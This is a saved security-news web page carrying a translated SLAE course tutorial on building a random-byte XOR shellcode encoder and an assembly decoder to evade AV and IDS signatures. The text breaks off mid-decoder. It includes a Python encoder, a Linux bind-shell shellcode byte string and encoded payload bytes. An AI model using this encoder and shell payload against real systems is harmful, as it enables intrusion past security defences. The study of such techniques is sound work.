<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>【技术分享】SLAE：如何开发自定义的RBIX Shellcode编码解码器 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="SLAE,Shellcode"/>
    
        <meta name="description" content="本文介绍了绕过AV以及IDS的一种简单方法，我们可以利用这种方法绕过基于模式匹配的安全软件或者硬件。这篇文章主要涉及到我在SecurityTube Linux汇编专家认证系列任务中用到的shellcode编码器及解码器相关技术。"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>【技术分享】SLAE：如何开发自定义的RBIX Shellcode编码解码器</h2>
                <div class="article-msg">
                    <span class="time">2017-08-24 14:04:21</span>
                    
                                        <span class="read">阅读：11573次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_4305"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="4305" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href="https://www.rcesecurity.com/2015/01/slae-custom-rbix-shellcode-encoder-decoder"
                             target="_blank">来源： rcesecurity.com</a></span>
                    
                    
                    <div style="margin-top:10px; ">
                        <a href="/member/contribute?uid=2819002922" style="color:#848e99;">
                            <img src="http://p1.qhmsg.com/dm/150_150_100/t0104d1b8b4ca36e961.jpg" data-is-avatar="true"
                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
                        </a>

                    </div>
                    <span class="orig">作者：<a href="/member/contribute?uid=2819002922" style="color:#848e99;">興趣使然的小胃</a></span>
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-align: center; text-indent: 2em;"><img src="http://p8.qhimg.com/t0149b2f1ba246230dc.jpg" title="t0149b2f1ba246230dc.jpg" alt="http://p8.qhimg.com/t0149b2f1ba246230dc.jpg"/></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); font-size: 16px; word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-weight: 900; color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">译者：</span></strong></span><a href="http://bobao.360.cn/member/contribute?uid=2819002922" target="_blank" style="color: rgb(0, 112, 192); line-height: 28px; font-weight: 900; text-decoration: underline; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px;"><span style="font-size: 18px;"><strong><span style="font-size: 18px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">興趣使然的小胃</span></strong></span></a></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); font-size: 16px; word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-size: 18px; font-weight: 900; color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">预估稿费：200RMB</span></strong></span></p><p style="margin: 0px 25px 8px; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); font-size: 16px; word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; white-space: normal; background: white; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-size: 18px; font-weight: 900; color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></strong></span></p><p><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><strong>一、前言</strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><hr/><p style="text-indent: 2em;"><span style="text-indent: 2em; font-size: 16px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在渗透测试过程中，反病毒软件（AV）以及入侵检测系统（IDS）是非常令人讨厌的存在。这些东西通常是导致攻击载荷失效、系统锁定或者渗透测试人员脾气爆炸的罪魁祸首。本文介绍了绕过AV以及IDS的一种简单方法，我们可以利用这种方法绕过基于模式匹配的安全软件或者硬件。这并不是一种面面俱到的解决方法，并非为绕过强大的启发式系统而设计，但可以作为一个非常好的研究起点，我们可以进一步改进相应的编码及混淆技术。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这篇文章主要涉及到我在SecurityTube Linux汇编专家认证系列任务中用到的shellcode编码器及解码器相关技术。</span></p><p style="text-indent: 2em;"><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><strong>二、随机字节插入异或编码方案</strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><hr/><p style="text-indent: 2em;"><span style="text-indent: 2em; font-size: 16px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">随机字节插入异或编码（Random-Byte-Insertion-XOR Encoding，RBIX编码）方案本身是非常简单的一种方案。主要思想是将某个随机字节作为异或（XOR）操作的基础值，以上一个操作的结果为基础，继续处理下一个异或操作。第3个以及第4个字节的处理过程也遵循相同的方式。编码过程的处理流程图如下图所示：</span></p><p style="text-align: center;"><img src="http://p9.qhimg.com/t01df05ad0f6bc08b30.jpg" title="t01cbdc6eb84a6791dc.jpg" alt="http://p4.qhimg.com/t01cbdc6eb84a6791dc.jpg"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先（在步骤#1执行之前），编码器将输入的shellcode按3字节长度切分成多个数据块，然后在每个数据块的头部添加一个随机字节（0x01到0xFF之间的一个值），因此这类随机字节在各数据块上各不一样。如果shellcode的大小不是3字节的整数倍，那么我们需要在最后一个数据块中添加NOP填充字节（0x90）。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">在第2个步骤中，编码器将第1个字节（即随机的字节）与第2个字节（原始shellcode的首个字节）进行异或，将第2个字节的值替换为异或后的值。第3个步骤接收第1次异或操作的结果，将该结果与第3个字节进行异或，最后一个步骤使用相同的处理过程，将上次异或操作的结果与当前数据块的最后一个字节进行异或。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">最终我们可以得到一个看上去完全碎片化的内存数据。</span></p><p style="text-indent: 2em;"><br/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><strong>三、Python编码器</strong></span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; font-size: 16px;">基于Python的编码器如下所示：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:python;toolbar:false">#!/usr/bin/python
#SLAE&nbsp;-&nbsp;Assignment&nbsp;#4:&nbsp;Custom&nbsp;Shellcode&nbsp;Encoder/Decoder
#Author:&nbsp;Julien&nbsp;Ahrens&nbsp;(@MrTuxracer)
#Website:&nbsp;&nbsp;

from&nbsp;random&nbsp;import&nbsp;randint
#Payload:&nbsp;Bind&nbsp;Shell&nbsp;SLAE-Assignment&nbsp;#1
shellcode&nbsp;=&nbsp;&quot;\x6a\x66\x58\x6a\x01\x5b\x31\xf6\x56\x53\x6a\x02\x89\xe1\xcd\x80\x5f\x97\x93\xb0\x66\x56\x66\x68\x05\x39\x66\x53\x89\xe1\x6a\x10\x51\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x56\x57\x89\xe1\xcd\x80\xb0\x66\x43\x56\x56\x57\x89\xe1\xcd\x80\x59\x59\xb1\x02\x93\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\x89\xca\xcd\x80&quot;
badchars&nbsp;=&nbsp;[&quot;\x00&quot;]
def&nbsp;xorBytes(byteArray):&nbsp;#&nbsp;Randomize&nbsp;first&nbsp;byte&nbsp;rnd=randint(1,255)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;xor1=(rnd&nbsp;^&nbsp;byteArray[0])&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;xor2=(xor1&nbsp;^&nbsp;byteArray[1])&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;xor3=(xor2&nbsp;^&nbsp;byteArray[2])
&nbsp;&nbsp;&nbsp;&nbsp;xorArray=bytearray()
&nbsp;&nbsp;&nbsp;&nbsp;xorArray.append(rnd)
&nbsp;&nbsp;&nbsp;&nbsp;xorArray.append(xor1)
&nbsp;&nbsp;&nbsp;&nbsp;xorArray.append(xor2)
&nbsp;&nbsp;&nbsp;&nbsp;xorArray.append(xor3)
return&nbsp;cleanBadChars(byteArray,&nbsp;xorArray,&nbsp;badchars)

def&nbsp;cleanBadChars(origArray,&nbsp;payload,&nbsp;badchars):&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;k&nbsp;in&nbsp;badchars:&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Ooops,&nbsp;BadChar&nbsp;found&nbsp;:(&nbsp;Do&nbsp;XOR&nbsp;stuff&nbsp;again&nbsp;with&nbsp;a&nbsp;new&nbsp;random&nbsp;value&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;This&nbsp;could&nbsp;run&nbsp;into&nbsp;an&nbsp;infinite&nbsp;loop&nbsp;in&nbsp;some&nbsp;cases&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;payload.find(k)&nbsp;&gt;=&nbsp;0:&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload=xorBytes(origArray)
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;payload

def&nbsp;encodeShellcode&nbsp;(byteArr):&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;shellcode=bytearray()&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;shellcode.extend(byteArr)
&nbsp;&nbsp;&nbsp;&nbsp;encoded=bytearray()
&nbsp;&nbsp;&nbsp;&nbsp;tmp=bytearray()
&nbsp;&nbsp;&nbsp;&nbsp;final=&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Check&nbsp;whether&nbsp;shellcode&nbsp;is&nbsp;aligned
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(shellcode)&nbsp;%&nbsp;3&nbsp;==&nbsp;1:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shellcode.append(0x90)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shellcode.append(0x90)
&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;len(shellcode)&nbsp;%&nbsp;3&nbsp;==&nbsp;2:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;shellcode.append(0x90)
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Loop&nbsp;to&nbsp;split&nbsp;shellcode&nbsp;into&nbsp;3-byte-blocks
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;i&nbsp;in&nbsp;range(0,len(shellcode),3):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp_block=bytearray()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp_block.append(shellcode[i])
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp_block.append(shellcode[i+1])
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tmp_block.append(shellcode[i+2])

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Do&nbsp;the&nbsp;RND-Insertion&nbsp;and&nbsp;chained&nbsp;XORs
&nbsp;&nbsp;&nbsp;&nbsp;tmp=xorBytes(tmp_block)

&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Some&nbsp;formatting&nbsp;things&nbsp;for&nbsp;easier&nbsp;use&nbsp;in&nbsp;NASM&nbsp;:)
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;y&nbsp;in&nbsp;tmp:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(str(hex(y)))&nbsp;==&nbsp;3:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final+=str(hex(y)[:2])&nbsp;+&nbsp;&quot;0&quot;&nbsp;+&nbsp;str(hex(y)[2:])+&quot;,&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;final+=hex(y)+&quot;,&quot;

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;final[:-1]
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
print&nbsp;&quot;Encoded&nbsp;Shellcode:\r&quot;&nbsp;
print&nbsp;encodeShellcode(shellcode)</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; font-size: 16px;">这个脚本可以生成NASM兼容的shellcode，对导致攻击过程失败的某些异常字符也进行了处理。这个脚本用到了我在SLAE #1号任务中使用过的shellcode，其作用只是简单地将shell接口绑定到1337端口上。脚本会生成编码后的shellcode，输出结果如下图所示，其中我们看不到0x00这个字节，因为这个字节处于“字节黑名单”中，已经被妥善处理：</span><br/></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; font-size: 16px;"><img src="http://p4.qhimg.com/t01106b7582c9e1cb6d.png" title="t0130325b945d41667e.png" alt="http://p9.qhimg.com/t0130325b945d41667e.png"/></span></p><p><br/></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">四、Shellcoder解码器</span></strong></p><p style="text-indent: 2em;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></strong></p><hr/><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; font-size: 16px;">为了将编码后的shellcode恢复到原始的形式（即解码处理过程），我将一个解码器放在经过编码的shellcode的开头部位，这个解码器可以读取并解码内存中的shellcode，然后再执行这个shellcode。简单的解码过程如下图所示：</span></p><p style="text-align: center;"><img src="http://p5.qhimg.com/t01af5fc9cec0351085.jpg" title="t015a64c70d8aa07d96.jpg" alt="http://p3.qhimg.com/t015a64c70d8aa07d96.jpg"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">将不同字节彼此异或处理，并删除附加的字节后，我们可以将shellcode恢复到最初状态。现在我们可以好好分析真正有趣的部分：使用汇编语言来实现解码器。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">首先，寄存器的布局信息如下所示：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">EAX: 每次异或操作的第一个操作数</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">EBX: 每次异或操作的第二个操作数</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">ECX, EDX: 循环计数器</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">ESI: 指向编码后shellcode的指针</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">EDI: 指向解码后shellcode的指针</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为了处理编码后的shellcode，我们需要一个寄存器（ESI）来指向shellcode的内存地址。我们还需要shellcode的长度值，这个值被后面的一个指针所引用，因此这里我会先跳过这个值的具体信息。为了获取地址信息，我们使用了<strong>jmp-call-pop</strong>（跳转、调用、弹出）技术：</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">global&nbsp;_start

section&nbsp;.text&nbsp;
_start:&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;getshellcode
decoder:&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;pop&nbsp;esi&nbsp;;&nbsp;&nbsp;&nbsp;&nbsp;pointer&nbsp;to&nbsp;shellcode&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;push&nbsp;esi;&nbsp;&nbsp;&nbsp;&nbsp;save&nbsp;address&nbsp;of&nbsp;shellcode&nbsp;for&nbsp;later&nbsp;execution&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;edi,&nbsp;esi&nbsp;;copy&nbsp;address&nbsp;of&nbsp;shellcode&nbsp;to&nbsp;edi&nbsp;to&nbsp;work&nbsp;with&nbsp;it
[...]
get_shellcode:&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;decoder&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;shellcode:&nbsp;db&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;0x60,0x0a,0x6c,0x34,0xa6,0xcc,0xcd,0x96,0xf9,0xc8,0x3e,0x68,0xa6,0xf5,0x9f,0x9d,0x37,0xbe,0x5f,0x92,0x5d,0xdd,0x82,0x15,0xe4,0x77,0xc7,0xa1,0xdc,0x8a,0xec,0x84,0xe2,0xe7,0xde,0xb8,0x17,0x44,0xcd,0x2c,0x1d,0x77,0x67,0x36,0x18,0x4f,0xc6,0x27,0x55,0x98,0x18,0xa8,0x52,0x34,0x87,0x83,0xdc,0x8a,0xdd,0x54,0xa5,0x44,0x89,0x09,0xa6,0x16,0x70,0x33,0xe6,0xb0,0xe6,0xb1,0xbf,0x36,0xd7,0x1a,0x5b,0xdb,0x82,0xdb,0xea,0x5b,0x59,0xca,0x23,0x93,0xac,0x61,0x0d,0x8d,0xc4,0xbd,0xed,0x14,0xa4,0xaf,0xe0,0x88,0xa7,0x88,0x25,0x56,0x3e,0x56,0x63,0x4c,0x2e,0x47,0x5c,0x32,0xbb,0x58,0xc3,0x82,0x0b,0xc1,0xff,0x32,0xb2,0x22&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;len:&nbsp;equ&nbsp;$-shellcode</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; font-size: 16px;">在POP及MOV指令后，ESI寄存器以及EDI寄存器指向编码后的shellcode，此外相应的指针也会被PUSH到栈上，以便在最后一个步骤执行shellcode。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">现在，我们需要清理某些寄存器。但要记住的是，我们正在处理的是EAX以及EBX的低字节部分（即AL以及BL），因此我们不需要完全清除这些寄存器，这样可以省下一些字节：</span></p><pre class="brush:plain;toolbar:false">xor&nbsp;ecx,&nbsp;ecx&nbsp;;&nbsp;&nbsp;&nbsp;&nbsp;clear&nbsp;inner&nbsp;loop-counter&nbsp;
xor&nbsp;edx,&nbsp;edx&nbsp;;&nbsp;&nbsp;&nbsp;&nbsp;clear&nbsp;outer&nbsp;loop-counter</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; font-size: 16px;">接下来是真正的解码函数。异或操作基于AL以及BL，因为我们每次只异或处理1个字节。编码后的shellocde的首个字节（ESI）会被MOV到AL中，下一个字节（ESI+1）会作为第二个XOR操作数被放到BL中。</span></p><pre class="brush:plain;toolbar:false">mov&nbsp;al,&nbsp;[esi]&nbsp;&nbsp;&nbsp;;get&nbsp;first&nbsp;byte&nbsp;from&nbsp;the&nbsp;encoded&nbsp;shellcode&nbsp;
mov&nbsp;bl,&nbsp;[esi+1]&nbsp;;get&nbsp;second&nbsp;byte&nbsp;from&nbsp;the&nbsp;encoded&nbsp;shellcode</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em; font-size: 16px;">当AL以及BL设置完毕后，它们就可以被异或处理，生成的字节存放在AL中，会被MOV到EDI中。由于EDI指向的是编码后的shellcode的地址，因此实际上我们正在做的是将编码后的shellcode替换为解码后的shellcode，这样就能省下许多内存空间。</span></p><pre class="brush:plain;toolbar:false">xor&nbsp;al,&nbsp;bl&nbsp;;xor&nbsp;them&nbsp;(result&nbsp;is&nbsp;saved&nbsp;to&nbsp;eax)&nbsp;
